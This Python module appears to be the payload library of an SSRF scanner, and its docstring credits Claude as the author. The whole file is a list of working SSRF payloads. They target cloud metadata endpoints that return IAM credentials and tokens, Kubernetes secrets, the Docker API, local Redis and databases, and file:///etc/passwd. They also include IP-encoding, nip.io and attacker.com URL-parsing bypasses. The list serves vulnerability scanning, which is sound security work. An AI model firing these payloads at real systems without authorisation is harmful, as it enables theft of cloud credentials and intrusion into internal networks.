"""ssrf payload library — generated dev-time by Claude.

Each entry has a target URL + regex marker that proves the response came
from inside the target's network. The scanner injects URLs into common
keys (url=, src=, fetch=, etc.) and looks for the marker in the response.

Categories:
  aws-imds      AWS IMDSv1 (IMDSv2 needs PUT token; not covered here)
  gcp-metadata  Google Cloud metadata server
  azure-imds    Azure Instance Metadata Service
  do-metadata   DigitalOcean droplet metadata
  oracle-imds   Oracle Cloud Infrastructure metadata
  alibaba-imds  Alibaba ECS metadata
  tencent-imds  Tencent Cloud CVM metadata
  ibm-imds      IBM Cloud metadata
  kubelet       Kubernetes kubelet / etcd internal
  docker-api    Docker daemon socket exposed via HTTP
  localhost     127.0.0.1 / ::1 / 0.0.0.0 reachability
  internal-net  RFC-1918 private ranges
  schema-bypass file:// / gopher:// / dict:// / ldap://
  dns-rebind    nip.io / localtest.me variants
"""

SSRF_PAYLOADS = [
  # ── AWS IMDSv1 (Capital-One-breach style) ──
  {"url": "http://169.254.169.254/latest/meta-data/", "matcher": r"ami-id|instance-id|local-ipv4|public-keys|security-credentials", "category": "aws-imds", "name": "AWS IMDS root", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "matcher": r"AccessKeyId|SecretAccessKey|Token|Expiration", "category": "aws-imds", "name": "AWS IAM credentials", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/latest/user-data/", "matcher": r"#!/bin/|cloud-init|^\s*[A-Z_]+=", "category": "aws-imds", "name": "AWS user-data", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://169.254.169.254/latest/meta-data/iam/info", "matcher": r"InstanceProfileArn|LastUpdated|InstanceProfileId", "category": "aws-imds", "name": "AWS IAM info", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "matcher": r"accountId|imageId|availabilityZone", "category": "aws-imds", "name": "AWS instance identity doc", "severity": "MEDIUM", "cvss": 6.5},

  # ── AWS IMDS — bypass tricks (DNS-style / decimal / octal IP) ──
  {"url": "http://[::ffff:169.254.169.254]/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS IPv6 mapped", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://2852039166/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS decimal IP", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254.nip.io/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS nip.io DNS", "severity": "CRITICAL", "cvss": 9.8},

  # ── GCP metadata ──
  {"url": "http://metadata.google.internal/computeMetadata/v1/", "matcher": r"instance/|project/|service-accounts", "category": "gcp-metadata", "name": "GCP metadata root", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "matcher": r"access_token|expires_in|token_type", "category": "gcp-metadata", "name": "GCP SA token", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "matcher": r"^[a-z0-9-]{6,30}$", "category": "gcp-metadata", "name": "GCP project ID", "severity": "MEDIUM", "cvss": 5.3},

  # ── Azure IMDS ──
  {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "matcher": r"compute|networkInterface|vmId", "category": "azure-imds", "name": "Azure IMDS instance", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "matcher": r"access_token|expires_in|client_id", "category": "azure-imds", "name": "Azure managed-identity token", "severity": "CRITICAL", "cvss": 9.8},

  # ── DigitalOcean ──
  {"url": "http://169.254.169.254/metadata/v1/", "matcher": r"droplet_id|interfaces|hostname|user-data", "category": "do-metadata", "name": "DigitalOcean metadata", "severity": "CRITICAL", "cvss": 9.8},

  # ── Oracle Cloud ──
  {"url": "http://169.254.169.254/opc/v2/instance/", "matcher": r"availabilityDomain|compartmentId|displayName", "category": "oracle-imds", "name": "Oracle Cloud instance", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://169.254.169.254/opc/v2/identity/", "matcher": r"compartmentId|tenancyId|userId", "category": "oracle-imds", "name": "Oracle Cloud identity", "severity": "CRITICAL", "cvss": 9.1},

  # ── Alibaba ECS ──
  {"url": "http://100.100.100.200/latest/meta-data/", "matcher": r"image-id|instance-id|region-id|hostname", "category": "alibaba-imds", "name": "Alibaba ECS metadata", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "matcher": r"AccessKeyId|AccessKeySecret|SecurityToken", "category": "alibaba-imds", "name": "Alibaba RAM credentials", "severity": "CRITICAL", "cvss": 9.8},

  # ── Tencent Cloud ──
  {"url": "http://metadata.tencentyun.com/latest/meta-data/", "matcher": r"instance-id|local-ipv4|region", "category": "tencent-imds", "name": "Tencent CVM metadata", "severity": "CRITICAL", "cvss": 9.1},

  # ── IBM Cloud ──
  {"url": "http://169.254.169.254/metadata/v1/instance", "matcher": r"vpc_id|profile|crn", "category": "ibm-imds", "name": "IBM Cloud instance", "severity": "HIGH", "cvss": 7.5},

  # ── Kubernetes ──
  {"url": "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets", "matcher": r'"kind":\s*"Secret"|service-account-token', "category": "kubelet", "name": "K8s API secrets", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:10250/pods/", "matcher": r'"kind":\s*"PodList"|namespace', "category": "kubelet", "name": "Kubelet read-only API", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:2379/v2/keys/", "matcher": r'"action":|"node":\s*\{', "category": "kubelet", "name": "etcd v2 keys", "severity": "CRITICAL", "cvss": 9.8},

  # ── Docker daemon ──
  {"url": "http://localhost:2375/version", "matcher": r"\"ApiVersion\"|\"Version\":\"\\d", "category": "docker-api", "name": "Docker daemon 2375", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:2375/containers/json", "matcher": r"\"Id\":\"[a-f0-9]+\"|\"Image\"", "category": "docker-api", "name": "Docker container list", "severity": "CRITICAL", "cvss": 9.8},

  # ── Localhost reachability ──
  {"url": "http://localhost/",  "matcher": r"It works!|Welcome to nginx|Apache.*Server|<title>Index of /", "category": "localhost", "name": "localhost root",  "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://127.0.0.1/",  "matcher": r"It works!|Welcome to nginx|Apache.*Server|<title>Index of /", "category": "localhost", "name": "127.0.0.1 root", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://[::1]/",       "matcher": r"<html|<title|<body",  "category": "localhost", "name": "IPv6 ::1",  "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://0.0.0.0/",    "matcher": r"<html|<title|<body",  "category": "localhost", "name": "0.0.0.0 binding", "severity": "MEDIUM", "cvss": 5.3},

  # ── Common localhost services ──
  {"url": "http://localhost:6379/",  "matcher": r"-ERR wrong number|PONG", "category": "localhost", "name": "Redis on 6379", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://localhost:11211/", "matcher": r"VERSION|ERROR",          "category": "localhost", "name": "Memcached on 11211", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:9200/",  "matcher": r"\"cluster_name\"|elasticsearch", "category": "localhost", "name": "Elasticsearch on 9200", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:5432/",  "matcher": r"FATAL|password",         "category": "localhost", "name": "Postgres on 5432", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:3306/",  "matcher": r"mysql|MariaDB|HOSTNAME", "category": "localhost", "name": "MySQL on 3306", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:27017/", "matcher": r"It looks like you are trying to access MongoDB", "category": "localhost", "name": "MongoDB on 27017", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:8500/v1/agent/self", "matcher": r"\"Config\":|consul", "category": "localhost", "name": "Consul agent 8500", "severity": "HIGH", "cvss": 7.5},

  # ── RFC-1918 internal ──
  {"url": "http://10.0.0.1/",     "matcher": r"<html|router|admin",  "category": "internal-net", "name": "10.0.0.1 gateway", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://172.17.0.1/",   "matcher": r"<html|router|admin",  "category": "internal-net", "name": "Docker host 172.17.0.1", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://192.168.1.1/",  "matcher": r"<html|router|admin",  "category": "internal-net", "name": "192.168.1.1 router", "severity": "MEDIUM", "cvss": 5.3},

  # ── Schema bypass ──
  {"url": "file:///etc/passwd",                  "matcher": r"root:.*:0:0",       "category": "schema-bypass", "name": "file:// /etc/passwd", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "file:///c:/windows/win.ini",          "matcher": r"\[fonts\]|\[extensions\]", "category": "schema-bypass", "name": "file:// Windows win.ini", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "dict://localhost:6379/info",          "matcher": r"redis_version|connected_clients", "category": "schema-bypass", "name": "dict:// Redis info", "severity": "HIGH", "cvss": 7.5},
  {"url": "gopher://localhost:6379/_INFO",       "matcher": r"redis_version",   "category": "schema-bypass", "name": "gopher:// Redis", "severity": "CRITICAL", "cvss": 9.1},

  # ── DNS-rebind ──
  {"url": "http://localtest.me/",             "matcher": r"<html|<title|<body", "category": "dns-rebind", "name": "localtest.me → 127.0.0.1", "severity": "MEDIUM", "cvss": 6.5},
  {"url": "http://127.0.0.1.nip.io/",         "matcher": r"<html|<title|<body", "category": "dns-rebind", "name": "nip.io → loopback", "severity": "MEDIUM", "cvss": 6.5},

  # ── userinfo / fragment / slash bypasses ──
  {"url": "http://169.254.169.254%23.attacker.com/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS fragment bypass", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://attacker.com@169.254.169.254/latest/meta-data/",    "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS userinfo bypass", "severity": "CRITICAL", "cvss": 9.8},
]
